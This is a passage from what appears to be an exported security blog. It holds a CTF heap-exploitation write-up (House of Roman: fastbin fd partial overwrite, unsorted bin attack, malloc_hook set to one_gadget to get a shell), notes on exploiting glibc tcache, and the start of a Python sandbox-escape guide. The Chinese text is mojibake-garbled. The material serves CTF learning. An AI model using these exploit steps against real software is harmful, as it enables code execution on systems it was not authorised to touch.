class="line">info(&quot;åˆ©ç”¨ off by one ,  chunk  1&#39;s size --&gt; 0x71&quot;)</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆä¸¤ä¸ª <code>fastbin</code> ï¼Œç„¶ååˆ©ç”¨ <code>uaf</code> ï¼Œéƒ¨åˆ†åœ°å€å†™ï¼ŒæŠŠ <code>B</code> é“¾å…¥åˆ° <code>fastbin</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">info(<span class="string">&quot;åˆ›å»ºä¸¤ä¸ª 0x70 çš„ fastbin&quot;</span>)</span><br><span class="line">heap_po = <span class="string">&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line">info(<span class="string">&quot;æŠŠ chunk&#x27;1 é“¾å…¥åˆ° fastbin é‡Œé¢&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è°ƒè¯•çœ‹çœ‹æ­¤æ—¶ <code>fastbin</code> çš„çŠ¶æ€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x555555757160 â€”â–¸ 0x555555757020 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x7ffff7dd1b78</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><blockquote><p><code>0x555555757020</code> å°±æ˜¯ <code>chunk B</code></p></blockquote><p> ç„¶åé€šè¿‡ä¿®æ”¹ <code>B-&gt;fd</code> çš„ä½ <code>2</code> å­—èŠ‚ï¼Œ ä½¿å¾— <code>B-&gt;fd= malloc_hook - 0x23</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># malloc_hook ä¸Šæ–¹</span><br><span class="line">malloc_hook_nearly &#x3D; &quot;\xed\x1a&quot;</span><br><span class="line">edit(1,malloc_hook_nearly)</span><br><span class="line">info(&quot;éƒ¨åˆ†å†™ï¼Œä¿®æ”¹ fastbin-&gt;fd ---&gt; malloc_hook&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶ååˆ†é… <code>3</code> ä¸ª <code>0x70</code> çš„ <code>chunk</code> ï¼Œå°±å¯ä»¥æ‹¿åˆ° <code>malloc_hook</code> æ‰€åœ¨çš„é‚£ä¸ª <code>chunk</code> .</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(0x65,0)</span><br><span class="line">create(0x65,0)</span><br><span class="line">create(0x65,0)</span><br></pre></td></tr></table></figure><p>ç„¶åÂ <code>free</code>Â æ‰Â <code>E</code>Â ï¼Œè¿›å…¥Â <code>fastbin</code>Â ï¼Œåˆ©ç”¨Â <code>uaf</code>Â è®¾ç½®Â <code>E-&gt;fd = 0</code>Â ï¼Œ ä¿®å¤äº†Â <code>fastbin</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(15)</span><br><span class="line">edit(15,p64(0x00))</span><br><span class="line">info(&quot;å†æ¬¡ç”Ÿæˆ 0x71 çš„ fastbin, åŒæ—¶ä¿®æ”¹ fd &#x3D;0, ä¿®å¤ fastbin&quot;)</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯ unsorted bin æ”»å‡»ï¼Œä½¿å¾— malloc_hook çš„å€¼ä¸º main_arena+88</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(0xc8,1)</span><br><span class="line">create(0xc8,1)</span><br><span class="line">create(0x18,2)</span><br><span class="line">create(0xc8,3)</span><br><span class="line">create(0xc8,4)</span><br><span class="line">free(1)</span><br><span class="line">po &#x3D; &quot;B&quot;*8</span><br><span class="line">po +&#x3D; &quot;\x00\x1b&quot;</span><br><span class="line">edit(1,po)</span><br><span class="line">create(0xc8,1)</span><br><span class="line">info(&quot;unsorted bin ä½¿å¾— malloc_hook æœ‰ libc çš„åœ°å€&quot;)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ ä¿®æ”¹ <code>malloc_hook</code> çš„ä½ä¸‰ä¸ªå­—èŠ‚ ï¼Œä½¿å¾— <code>malloc_hook</code> ä¸º <code>one_gadget</code> çš„åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">over &#x3D; &quot;R&quot;*0x13   # padding for malloc_hook</span><br><span class="line">over +&#x3D; &quot;\xa4\xd2\xaf&quot;</span><br><span class="line">edit(0,over)</span><br><span class="line"></span><br><span class="line">info(&quot;malloc_hook to one_gadget&quot;)</span><br></pre></td></tr></table></figure><p>ç„¶å <code>free</code>  ä¸¤æ¬¡åŒä¸€ä¸ª  <code>chunk</code>  ï¼Œè§¦å‘  <code>malloc_printerr</code>  ï¼Œ <code>getshell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(18)</span><br><span class="line">free(18)</span><br></pre></td></tr></table></figure><h2 id="link"><a href="#link" class="headerlink" title="link"></a>link</h2><p><a href="https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc">https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc</a></p><p><a href="https://github.com/romanking98/House-Of-Roman">https://github.com/romanking98/House-Of-Roman</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thread local caching in glibc malloc</title>
      <link href="thread-local-caching-in-glibc-malloc.html"/>
      <url>thread-local-caching-in-glibc-malloc.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="thread-local-caching-in-glibc-malloc"><a href="#thread-local-caching-in-glibc-malloc" class="headerlink" title="thread local caching in glibc malloc"></a>thread local caching in glibc malloc</h1><h2 id="TCACHE-2-26"><a href="#TCACHE-2-26" class="headerlink" title="TCACHE (2.26+)"></a>TCACHE (2.26+)</h2><p>Thread local storage caching</p><p>Singly linked list in chunkâ€™s <code>fd</code> (sim. to FastBins)</p><p>All sizes</p><p>Major performance enhancement</p><p>Not even trying to be secured :/</p><p>åœ¨ glibc 2.26çš„ç‰ˆæœ¬ä¸­æ·»åŠ äº†ä¸€ä¸ªæ–°çš„æœºåˆ¶ï¼Œè¿™ä¸ªæœºåˆ¶åå­—å« <strong>tcache</strong> ï¼Œ<a href="https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc">ä»å®˜ç½‘çš„æ¦‚è¿°æ¥çœ‹</a>è¿™æ˜¯ä¸€ä¸ªé€šè¿‡åˆ›å»ºçº¿ç¨‹ç¼“å­˜ä¸€å®šå¤§å°çš„ chunk ç”¨æ¥æå‡æ€§èƒ½ã€‚ç›®å‰åœ¨ ubuntu 18.04 çš„å‘è¡Œç‰ˆæœ¬ä¸­å·²ç»ä½¿ç”¨äº†è¿™ä¸ªæœºåˆ¶ã€‚</p><h2 id="New-structures"><a href="#New-structures" class="headerlink" title="New structures"></a>New structures</h2><p>åœ¨è¿™ä¸ªæ–°çš„æœºåˆ¶ä¸­æœ‰ä¸¤ä¸ªæ–°çš„ç»“æ„ä½“ï¼Œ<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l2927">tcache entry</a> ä»¥åŠ<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l2937">tcache_perthread_struct</a> è¿™ä¸¤ä¸ªéƒ½æ˜¯å¾ˆç®€å•çš„ç»“æ„ã€‚ä»–ä»¬è§„å®šäº†ä¸€ä¸ª tcache å®¹å™¨é»˜è®¤åŒ…å«7ä¸ª chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h2 id="tcahe-çš„ä½¿ç”¨"><a href="#tcahe-çš„ä½¿ç”¨" class="headerlink" title="tcahe çš„ä½¿ç”¨"></a>tcahe çš„ä½¿ç”¨</h2><p>Chunks can end up in the thread caches multiple ways:</p><ul><li>upon free: before the fastbin code in <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173">_int_free</a>, if the chunk has an appropriate size and the corresponding bin isnâ€™t full</li><li>upon malloc, there are 3 places where caches are filled<ul><li>if a fast chunk is returned, the other chunks from the corresponding fastbin are <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3588">used to fill the appropriate tcache bin</a>.</li><li><a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3647">the same is done</a> if a small chunk is returned by malloc.</li><li><ul><li>in the binning code, exact size matches are first put in the tcache <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3780">instead of returning immediately</a>.</li></ul></li></ul></li></ul><p>Chunks are taken from the tcache:</p><ul><li>in <code>__libc_malloc</code>, <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3064">before _int_malloc</a>.</li><li><a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3884">after the binning code</a>, if at least one exact match <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3784">was found</a>.</li><li>there can also be a limit on the number chunks that are put in the tcache in a run of the binning code. If thatâ€™s reached, the <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3867">last one found is returned</a>. However, this is <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l1796">unlimited by default</a>.</li></ul><p>Some observations:</p><ol><li>the tcache fill code in the <a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3588">fast path of malloc</a> will reverse the order of the chunks.</li><li>cached chunks wonâ€™t be coalesced<br>2.1 neither on free of neighboring chunks<br>2.2 nor with top when they are freed</li></ol><h2 id="Pwn-ä¸­çš„-tcache"><a href="#Pwn-ä¸­çš„-tcache" class="headerlink" title="Pwn ä¸­çš„ tcache"></a>Pwn ä¸­çš„ tcache</h2><p><strong>Tcahe</strong> ä¸ºäº†è¿½æ±‚æ€§èƒ½ï¼Œèˆå¼ƒäº†è®¸å¤šä»¥å‰å»ºç«‹èµ·æ¥çš„ check æœºåˆ¶ï¼Œè¿™å°±æ„å‘³è¿™ä¸€ä¸ªæˆ‘ä»¬ fake æˆ–è€… æ¶æ„æ„é€ ç ´åçš„ chunk åªè¦èƒ½ç¬¦åˆå¯¹å…¶å’ŒåŒ…è£…çš„æ£€æŸ¥å°±å¯ä»¥è¢«ä½¿ç”¨ã€‚</p><p>è¿™æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿè¿™å…¶å®è¯´ç™½äº†ï¼Œè¿™æ„å‘³ç€è®¸å¤š Glibc Pwnçš„æŠ€æœ¯å˜å¾—æ›´åŠ ç®€å•äº†ã€‚æ¯”å¦‚ä¸‹é¢çš„å‡ ä¸ªä¾‹å­ï¼š</p><h3 id="The-House-of-Spirit"><a href="#The-House-of-Spirit" class="headerlink" title="The House of Spirit"></a>The House of Spirit</h3><p>House of Spirit æ˜¯ <code>the Malloc Maleficarum</code> ä¸­çš„ä¸€ç§æŠ€æœ¯ã€‚</p><p>è¯¥æŠ€æœ¯çš„æ ¸å¿ƒåœ¨äºåœ¨ç›®æ ‡ä½ç½®å¤„ä¼ªé€  fastbin chunkï¼Œå¹¶å°†å…¶é‡Šæ”¾ï¼Œä»è€Œè¾¾åˆ°åˆ†é…<strong>æŒ‡å®šåœ°å€</strong>çš„ chunk çš„ç›®çš„ã€‚åœ¨è¿‡å»è¦æƒ³æ„é€  fastbin fake chunkï¼Œå¹¶ä¸”å°†å…¶é‡Šæ”¾æ—¶ï¼Œå¯ä»¥å°†å…¶æ”¾å…¥åˆ°å¯¹åº”çš„ fastbin é“¾è¡¨ä¸­ï¼Œéœ€è¦ç»•è¿‡ä¸€äº›å¿…è¦çš„æ£€æµ‹ï¼Œå³</p><ul><li><p>fake chunk çš„ ISMMAP ä½ä¸èƒ½ä¸º1ï¼Œå› ä¸º free æ—¶ï¼Œå¦‚æœæ˜¯ mmap çš„ chunkï¼Œä¼šå•ç‹¬å¤„ç†ã€‚</p></li><li><p>fake chunk åœ°å€éœ€è¦å¯¹é½ï¼Œ MALLOC_ALIGN_MASK</p></li><li><p>fake chunk çš„ size å¤§å°éœ€è¦æ»¡è¶³å¯¹åº”çš„ fastbin çš„éœ€æ±‚ï¼ŒåŒæ—¶ä¹Ÿå¾—å¯¹é½ã€‚</p></li><li><p>fake chunk çš„ next chunk çš„å¤§å°ä¸èƒ½å°äº <code>2 * SIZE_SZ</code>ï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äº<code>av-&gt;system_mem</code> ã€‚</p></li><li><p>fake chunk å¯¹åº”çš„ fastbin é“¾è¡¨å¤´éƒ¨ä¸èƒ½æ˜¯è¯¥ fake chunkï¼Œå³ä¸èƒ½æ„æˆ double free çš„æƒ…å†µã€‚</p></li></ul><p>  ç„¶è€Œåœ¨ tcahe çš„æœºåˆ¶ä¸‹åªéœ€è¦æ»¡è¶³ï¼š</p><ul><li>å®ƒæ˜¯ä¸€ä¸ª<code>2*SIZE_SZ</code>å¯¹é½çš„åœ°å€</li><li>å…¶å€¼<code>MINSIZE</code>åœ¨æœ€å¤§ç¼“å­˜å—å¤§å°ï¼ˆ1032/516å­—èŠ‚ï¼‰ä¹‹é—´ã€‚</li><li>åœ¨x64ä¸Šï¼Œå®ƒä¹Ÿä¸èƒ½æœ‰ç¬¬å››ä¸ªLSBé›†ã€‚</li></ul><h3 id="Overlapping-chunks"><a href="#Overlapping-chunks" class="headerlink" title="Overlapping chunks"></a>Overlapping chunks</h3><p>æˆ‘ä»¬çŸ¥é“ åœ¨ GLIBC Pwn ä¸­ OVerlapping chunksæ˜¯ä¸€ä¸ªå¸¸è§çš„åˆ©ç”¨æŠ€æœ¯ã€‚æˆ‘ä»¬é€šå¸¸æ˜¯å¯ä»¥é€šè¿‡è¦†ç›–å †çš„å¤´éƒ¨ï¼Œæ¯”å¦‚è¦†ç›–ä¸€ä¸ªå·²ç»é‡Šæ”¾çš„ chunk çš„ size åŸŸã€‚åœ¨è¿™ä¸ªæœºåˆ¶ä¸‹ï¼Œæˆ‘ä»¬ä»ç„¶ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>tacheä¸­çš„åƒåœ¾å›æ”¶æœºåˆ¶å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tcache_get</code>è´Ÿè´£ä»tcache binä¸­åˆ é™¤å—çš„ä»£ç ã€‚ç ´åchunkä¸­çš„<code>next</code>æŒ‡é’ˆ<code>tcache_entry</code>å¯ä»¥è¿”å›å®Œå…¨ä»»æ„çš„å—ã€‚</p><p>åœ¨è¿™ä¸ªæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šè¿‡ double free æ¥æ„é€ ä¸€ä¸ªå¾ªç¯çš„tcahe bin ä¹Ÿæ¯” fast bin çš„double freeç®€å•äº†ï¼Œå› ä¸ºåœ¨ç©ºé—²æ—¶æ²¡æœ‰å¯¹binçš„ç¬¬ä¸€ä¸ªæˆå‘˜è¿›è¡ŒåŒé‡æ£€æŸ¥ã€‚</p><h3 id="Smallbin-cache-filling-bck-write"><a href="#Smallbin-cache-filling-bck-write" class="headerlink" title="Smallbin cache filling bck write"></a>Smallbin cache filling bck write</h3><p>å› ä¸º tcahe å–æ¶ˆäº†ä¸€äº›æ£€æŸ¥ï¼Œå¦‚unlink ä¸­<code>bck-&gt;fd != victim</code>Â çš„<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3631">check</a>.è¿™æ„å‘³ç€</p><ul><li>House of Lore could èƒ½è¢«ä½¿ç”¨ (è™½ç„¶æˆ‘ä»¬æœ‰æ›´å¥½çš„æ–¹æ³•)</li><li>an uncontrolled write similar to the <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c">unsorted bck write</a> could be achieved</li></ul><h3 id="tcache-perthread-structs-as-corruption-targets"><a href="#tcache-perthread-structs-as-corruption-targets" class="headerlink" title="tcache_perthread_structs as corruption targets"></a>tcache_perthread_structs as corruption targets</h3><p>emmm ç”±äºçº¿ç¨‹ç®¡ç†çš„ä¸ä¸¥è°¨ï¼Œæå…¶æœ‰å¯èƒ½é€ æˆä¸€äº›ç ´åï¼Œå¦‚ç«äº‰ã€‚</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>è¿™ç‰¹ä¹ˆæ˜¯å‚»é€¼å§ï¼ï¼ï¼ï¼ï¼ï¼ </p><h2 id="link"><a href="#link" class="headerlink" title="link"></a>link</h2><p><a href="http://tukan.farm/2017/07/08/tcache/">http://tukan.farm/2017/07/08/tcache/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> cache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python æ²™ç›’ç»•è¿‡</title>
      <link href="awesome-python-sandbox-in-ciscn.html"/>
      <url>awesome-python-sandbox-in-ciscn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>æ€è€ƒäº†ä¸€ä¸‹ï¼ŒPythonæ²™ç®±é€ƒé€¸çš„æ„ä¹‰ï¼Œä¸è¿‡å°±æ˜¯å¦‚ä½•é€šè¿‡ç»•è¿‡é™åˆ¶ï¼Œæ‹¿åˆ°å‡ºé¢˜äººæˆ–è€…å®‰å…¨è¿ç»´äººå‘˜ä¸æƒ³è®©æˆ‘ä»¬æ‹¿åˆ°çš„â€å±é™©å‡½æ•°â€ï¼Œæˆ–è€…ç»•è¿‡Pythonç»ˆç«¯è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚</p><h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p>ä»¥å‰æˆ‘ä¹Ÿåšè¿‡ä¸€äº›Pythonæ²™ç›’é€ƒé€¸çš„å°é¢˜ç›®ï¼Œä¹Ÿç¿»è¯‘å’Œå†™è¿‡ä¸¤ç¯‡å…³äºPythonæ²™ç›’é€ƒé€¸çš„æ–‡ç« ã€‚ç„¶è€Œåœ¨è¿™æ¬¡å›½èµ›çš„é¢˜ç›®ï¼Œæˆ‘å¥½åƒåˆè¿›ä¸€æ­¥ç†è§£äº†Pythonæ²™ç®±â€¦</p><h3 id="ç»•è¿‡æ²™ç›’æ–¹æ³•"><a href="#ç»•è¿‡æ²™ç›’æ–¹æ³•" class="headerlink" title="ç»•è¿‡æ²™ç›’æ–¹æ³•"></a>ç»•è¿‡æ²™ç›’æ–¹æ³•</h3><h4 id="å…³äºimport"><a href="#å…³äºimport" class="headerlink" title="å…³äºimport"></a>å…³äºimport</h4><p>é€šå¸¸æ€è·¯ï¼Œæˆ‘ä»¬åº”è¯¥æ‰¾åˆ°é¢˜ç›®è¿˜ç»™æˆ‘ä»¬ç•™ä¸‹äº†ä»€ä¹ˆï¼Œé€šå¸¸è€Œè¨€<br>é€šå¸¸è€Œè¨€ï¼Œå‡ºé¢˜äººä¸€èˆ¬æ˜¯ç¦æ­¢å¼•å…¥æ•æ„ŸåŒ…ï¼Œæ¯”å¦‚ <strong>os</strong>æˆ–è€…<strong>system</strong>ï¼Œ</p><h5 id="0x01-ç»•è¿‡ï¼Œé€šè¿‡è·¯å¾„å¼•å…¥"><a href="#0x01-ç»•è¿‡ï¼Œé€šè¿‡è·¯å¾„å¼•å…¥" class="headerlink" title="0x01 ç»•è¿‡ï¼Œé€šè¿‡è·¯å¾„å¼•å…¥"></a>0x01 ç»•è¿‡ï¼Œé€šè¿‡è·¯å¾„å¼•å…¥</h5><p>Pythonçš„osæ¨¡å—çš„è·¯å¾„å‡ ä¹éƒ½æ˜¯/usr/lib/python2.7/os.pyä¸­<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è·¯å¾„å¼•å…¥ä¸€äº›æ¨¡å—</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h5 id="0x02-dir-ä¸dict"><a href="#0x02-dir-ä¸dict" class="headerlink" title="0x02 dir ä¸dict"></a>0x02 dir ä¸<strong>dict</strong></h5><p>é¦–å…ˆï¼Œæˆ‘ä»¬åº”è¯¥ç¡®å®šç¨‹åºè¿˜æœ‰å“ªäº›å†…ç½®å‡½æ•°å¯ä»¥ç”¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>dir __builtin__</code> æ¥è·å–å†…ç½®å‡½æ•°åˆ—è¡¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</span><br><span class="line">[<span class="string">&#x27;ArithmeticError&#x27;</span>, <span class="string">&#x27;AssertionError&#x27;</span>, <span class="string">&#x27;AttributeError&#x27;</span>, <span class="string">&#x27;BaseException&#x27;</span>, <span class="string">&#x27;BufferError&#x27;</span>, <span class="string">&#x27;BytesWarning&#x27;</span>, <span class="string">&#x27;DeprecationWarning&#x27;</span>, <span class="string">&#x27;EOFError&#x27;</span>, <span class="string">&#x27;Ellipsis&#x27;</span>, <span class="string">&#x27;EnvironmentError&#x27;</span>, <span class="string">&#x27;Exception&#x27;</span>, <span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;FloatingPointError&#x27;</span>, <span class="string">&#x27;FutureWarning&#x27;</span>, <span class="string">&#x27;GeneratorExit&#x27;</span>, <span class="string">&#x27;IOError&#x27;</span>, <span class="string">&#x27;ImportError&#x27;</span>, <span class="string">&#x27;ImportWarning&#x27;</span>, <span class="string">&#x27;IndentationError&#x27;</span>, <span class="string">&#x27;IndexError&#x27;</span>, <span class="string">&#x27;KeyError&#x27;</span>, <span class="string">&#x27;KeyboardInterrupt&#x27;</span>, <span class="string">&#x27;LookupError&#x27;</span>, <span class="string">&#x27;MemoryError&#x27;</span>, <span class="string">&#x27;NameError&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;NotImplemented&#x27;</span>, <span class="string">&#x27;NotImplementedError&#x27;</span>, <span class="string">&#x27;OSError&#x27;</span>, <span class="string">&#x27;OverflowError&#x27;</span>, <span class="string">&#x27;PendingDeprecationWarning&#x27;</span>, <span class="string">&#x27;ReferenceError&#x27;</span>, <span class="string">&#x27;RuntimeError&#x27;</span>, <span class="string">&#x27;RuntimeWarning&#x27;</span>, <span class="string">&#x27;StandardError&#x27;</span>, <span class="string">&#x27;StopIteration&#x27;</span>, <span class="string">&#x27;SyntaxError&#x27;</span>, <span 